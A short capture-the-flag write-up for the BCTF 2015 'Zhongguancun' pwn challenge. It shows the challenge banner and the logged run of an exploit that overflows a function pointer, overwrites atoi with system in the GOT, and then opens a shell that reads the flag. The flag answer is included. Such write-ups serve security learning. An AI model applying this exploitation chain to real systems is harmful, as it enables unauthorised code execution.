## BCTF 2015 - Zhongguancun (Pwn 450)
##### 21-23/03/2015 (48hr)
___

### Description: 
```
nc 146.148.60.107 6666
*********************************
*** Welcome to Zhong Guan Cun ***
*********************************
Are you dreaming of becoming a Milli$_$naire?
Come to sell some electronics!
```
___
### Solution

A detailed solution is within the exploit file.

```
ispo@nogirl ~/bctf $ python zhongguancun_exploit.py 
 **** PHASE 1: registering items ****
 **** PHASE 2: overflowing function pointer ****
 **** PHASE 3: tampering money pointer ****
 **** PHASE 4: changing atoi() to system() in GOT ****
	system 0x0003ada0	atoi 0x0002d160
	atoi - price*buy = 0x00df1160
 **** PHASE 5: triggering system() ****
 **** PHASE 6: opening shell ****
whoami 
	zhongguancun
pwd
	/home/zhongguancun
ls -la
	total 44
	drwxr-x--- 3 root zhongguancun  4096 Mar 21 01:29 .
	drwxr-xr-x 3 root root          4096 Mar 21 01:28 ..
	-rw-r--r-- 1 root zhongguancun    21 Jun 11  2014 .bash_logout
	-rw-r--r-- 1 root zhongguancun    57 Jun 11  2014 .bash_profile
	-rw-r--r-- 1 root zhongguancun   141 Jun 11  2014 .bashrc
	drwxr-xr-x 2 root zhongguancun  4096 Mar 21 01:28 apps
	-r--r----- 1 root zhongguancun    50 Mar 21 01:27 flag
	-rwxr-x--- 1 root zhongguancun 14132 Mar 20 14:08 zhongguancun
cat flag
	BCTF{h0w_could_you_byp4ss_vt4ble_read0nly_ch3cks}
exit
```
Flag is **BCTF{h0w_could_you_byp4ss_vt4ble_read0nly_ch3cks}**
___